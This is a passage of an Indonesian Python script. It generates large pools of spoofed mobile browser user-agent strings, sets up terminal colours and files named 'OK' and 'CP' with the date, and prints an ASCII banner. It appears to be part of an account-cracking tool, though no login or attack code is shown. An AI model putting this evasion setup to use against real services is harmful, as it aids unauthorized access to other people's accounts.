	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android '
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='en-us; ASUS_T00F Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/534.30 (KHTML, like Gecko) '
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.1.483'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Oppo A4 Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (X11'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux x86_64)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; Redmi 5 Plus Build/OPM1.171019.019'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/13.4.0.1306 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 4A Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH2349) AppleWebKit/537.36'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X682C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android 7.0;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='Infinix X559C Build/NRD90M)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['U; Android 8.1.0; en-us; Redmi 5 Plus Build/OPM1.171019.019)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.1.8 swan-mibrowser'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Oppo A4 Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android 10'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH1931 Build/QKQ1.200209.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; U; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ru-ru; Redmi 4A Build/N2G47H)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-N920)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Samsung Galaxy Note 9 Build/SM-N960N)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1. 15 (KHTML, like Gecko) Version/5.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/604.1.'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2012K11AG Build/L120G)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)86.0.4529.132 Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['MITO A75)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/11.4.8.1012 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
for t in range(10000):
    a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
    b=random.randrange(111111,210000)
    c=random.randrange(73,100)
    d=random.randrange(4200,4900)
    e=random.randrange(40,150)
    f= random.randrange(15, 40)
    g=random.randrange(11, 21)
    XILL=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-C7{f}F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{g}.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
    uaa.append(XILL)

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'

###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

###----------[ UNTUK ANIMASI ]----------###
def bra_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def bra_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
        
###----------[ BANNER MENUH ]----------###
def banner():
	print('''\033[1;34m
	                      ....                                                .:      
                                   ==.                                           ...:.    
               -:  ..:.      .     .-**:.                       :                =...-=   
              .*   ..-: .....  ...-= :*.....:..             .  ::...         ....:+:=-:-. 
              +=  ::--.       ..::%+.+*.  :=::...           . -=.:.::..   .-==-::+#-=*-=+ 
              #: .:--.     :=+*+*#%@++@+:.=+=-:.         -==-***+-:...:..**=-+=--##+#*-*:=
              %. -##**- .:=++---=-+#@*@%=:-=+#=...       +=-:**==-::=#+::*+-%@@@@@@@@@@@-=
          =.  #- -##*+*=.-=+-:-*#*##@@%%%%+:*@%-:.---:   =-:*-:-.:++*@#*%@@@@@@@@@@@@@@@++
         =%.  -+=:++=-++.:---%@@@@%%#****+++*#%@@%*==+==**+=:. ==.=@@@@@@@@@@@@@@@@@@@@%-=
         #%:   =+:==--=*:=%:+@@%%##**+=*#####*+*#%@@%@%*-==+:. .*+-+%@@@@@@@@@@@@@@@@@@*+*
*  +    .%%=.  .---=--=*:*@=%@%%#***###+@%#*=++=+*#%@@++::.-+--*@@@@+@@@@@@@@@@@@@@@@@@%#+
% -*-   .#*---. -..---+---%%@@@%%%%#+#+**++. ..:-*+%@%==.+=:*+%@@%@@@%@@@@@@@@@@@@@@@@%++.
%.:-=.   =*:::::. .-==-:-==@@@%%#+++++====::.:-+##%@%+=..-..:%@@%*@@@+@@@@@@@@@@@@@@@@%+= 
@=:::-:.  +-...   -++-- :**#@%*==++==---===+*#%%*+@%+-::::::+@@%=*@@%+%@%@@@@@@@@@@%%@*== 
%%:=---=-. :..  .-+*: .   :+#@@@#*+=--++*#++#%#==**:  ..:::%@@#*-*%#*=++*+#%####+###*=----
*@+-++***+=--:::+. .+#@*  :. .:=+*%%##*:-#%#+=-=.:    ....-@@@*=:++++-=::..::-=:=-=-:::=.=
:@%=::::::.. .  =#+:%%#+-%%= ...:=*##%%*-:=*+=-..    ..:=#@@@@#+-++=++-::...::-+==--:--.-#
 #*-===.     .  ...**-+-**-::%+ .::--=-=++-::-=:.   ..:--%@@@@#=:=*++*=-=..-----=::--=:-==
 :#-==+#=         .#=.:=:-:.-+- +- .:::::-==+=--:....:++:=%@@%=-=-*#%#-==--:..=*--+*=-##+.
  :-.=###.         --::--::...  :.-+.  .::...:-====--::.=---+++-:*===:+*=+.-+#%==###@@@%: 
   :- .:.   :+#%%#-  -+=:::**+=-.        :-.   ..:::-++=.....::-=+=+-:..-*=@@@%+%@@@@@%:  
    :*+++=:+**+**#%=  :---:-::..-==++++==::-:.    =+--+++.    ..==-.....:##@%*#@@#:..:.   
     .-::+@@%%#*++##.+#-:.....:+*+=----=+*+.::.   .=-:::-- ..:: .-.  .:..=@%=-%@@=        
  .      :=##%%%%###*%@%=....==--=**#######+....    . :..::  ..:. :  .:. .**=-##*+.       
    ..   ..:-**#--%@%%#%%: .-=*%@@%*++*=:-**:.    :.  .   :    ... .   . .-=:-*=*#=       
            ::*+--+*%@@@%*.+%@@@@@@*:::=:::=*=-:. .:. .. ....  .-. .:.   -+=-***+=*.      
            ..=+: -*-%*-#@%@@@%@@@@@=..:....-:..-..#+-::.::::..=*-..-+-:.+*+%+:--.-       
             .:+- .=:++=.*@@@%%#%%@@-=-. .-.   .=-:*-:==-==-=:-+%#=.++*##*=:*- .-.-       
              :=*:.-:==..#@@%%%#%%@@++.=++--:.-==+*=:  =*-..-#**-=*#=..=#+..=: :=-:       
               :*=..=-- :%@@@%%%###%%#: :=:. -#=:.=-.  =#:  :#=:..:**. .+#:.+-.==-        
                :*:.:-= :%@*########%%= .#*:.-*+:. :-..+@*. -##-  .+#- .*%*=-.=:          
              .. :+..--. #%===+*#*##%##=*%%#=++*=.  :*-+%%=:#++*+.:***:-#*#*:=-           
                :.-+..-- -%--=+-#*%##*+#%%#***+++*=::#%%@%##*=+++***++##*++#*+--.         
               .-%#+=:.-:.*+--=:+++#%%###*#**+=+**+**#%#%%#*==**+++*#*******=+. -         
                .-++=::.-::#=-=---:=+#*+#=.-++=+-:++=*###@%%+=::++*=:*#*-:*-.+:.:-        
                 ..-+-::::::+-==----=%= :+  .+*-  +-..#=:+%%%:  -*=. :*:  =..=*=+*-       
                  . :=-::::-::-=++-:+@#..--..=-:  =. .-. .+*#:  .*:  .+. .***+=--**.      
                    . ==..:::=-.:-+++*#+=::.::-=:-=-.=:.  --==:..=+. :+*==-#**==-:+:      
            .     ..   +-...::+*=::--:--++-.:-::=::-=--::.::--=+=::==+=+=:-***+::-:+.     
                       .=... :-=#=:+-+*=+**+===----....:=-.:=::::::-=+=--:::+%#+=-+%:     
                        :..=..-:=-.=+--+***#++**===::.      :::......:::-::.:=++=:=*:     
                       .:.: :--::-.:***=+*#*:*--::++-:........::------::::----===-:+.     
                       :::    :=..::.=+++=::=+. -=:*===--:::::..:-::---:::-----:-::+-     
                                :::--=---=+=-..-===#=:.. .:........----=+**==:.:::-:      
                                       ....+=-=+=-##**+++++=-::::::.:-=--===-::::+=       
                                            .::..-=====-==--==-::::--=+-::::::::**-       
                                                   :----=====---:.  ..-.  .:..-#*:        
                                                           ..-==--=--:-:..:*=++:          

 __       __  ________  __        __         ______    ______   __       __                          
/  |  _  /  |/        |/  |      /  |       /      \  /      \ /  \     /  |                         
$$ | / \ $$ |$$$$$$$$/ $$ |      $$ |      /$$$$$$  |/$$$$$$  |$$  \   /$$ |                         
$$ |/$  \$$ |$$ |__    $$ |      $$ |      $$ |  $$/ $$ |  $$ |$$$  \ /$$$ |                         
$$ /$$$  $$ |$$    |   $$ |      $$ |      $$ |      $$ |  $$ |$$$$  /$$$$ |                         
$$ $$/$$ $$ |$$$$$/    $$ |      $$ |      $$ |   __ $$ |  $$ |$$ $$ $$/$$ |                         
$$$$/  $$$$ |$$ |_____ $$ |_____ $$ |_____ $$ \__/  |$$ \__$$ |$$ |$$$/ $$ |                         
$$$/    $$$ |$$       |$$       |$$       |$$    $$/ $$    $$/ $$ | $/  $$ |                         
$$/      $$/ $$$$$$$$/ $$$$$$$$/ $$$$$$$$/  $$$$$$/   $$$$$$/  $$/      $$/                          
                                                                                                     
 ________  __    __  ________        _______   __         ______    ______   __    __                
/        |/  |  /  |/        |      /       \ /  |       /      \  /      \ /  |  /  |               
$$$$$$$$/ $$ |  $$ |$$$$$$$$/       $$$$$$$  |$$ |      /$$$$$$  |/$$$$$$  |$$ | /$$/                
   $$ |   $$ |__$$ |$$ |__          $$ |__$$ |$$ |      $$ |__$$ |$$ |  $$/ $$ |/$$/                 
   $$ |   $$    $$ |$$    |         $$    $$< $$ |      $$    $$ |$$ |      $$  $$<                  
   $$ |   $$$$$$$$ |$$$$$/          $$$$$$$  |$$ |      $$$$$$$$ |$$ |   __ $$$$$  \                 
   $$ |   $$ |  $$ |$$ |_____       $$ |__$$ |$$ |_____ $$ |  $$ |$$ \__/  |$$ |$$  \                
   $$ |   $$ |  $$ |$$       |      $$    $$/ $$       |$$ |  $$ |$$    $$/ $$ | $$  |               
   $$/    $$/   $$/ $$$$$$$$/       $$$$$$$/  $$$$$$$$/ $$/   $$/  $$$$$$/  $$/   $$/                
                                                                                                     
  ______   __    __  __    __  __        __               ______   _______   __       __  __      __ 
 /      \ /  |  /  |/  |  /  |/  |      /  |             /      \ /       \ /  \     /  |/  \    /  |
/$$$$$$  |$$ | /$$/ $$ |  $$ |$$ |      $$ |            /$$$$$$  |$$$$$$$  |$$  \   /$$ |$$  \  /$$/ 
$$ \__$$/ $$ |/$$/  $$ |  $$ |$$ |      $$ |            $$ |__$$ |$$ |__$$ |$$$  \ /$$$ | $$  \/$$/  
$$      \ $$  $$<   $$ |  $$ |$$ |      $$ |            $$    $$ |$$    $$< $$$$  /$$$$ |  $$  $$/   
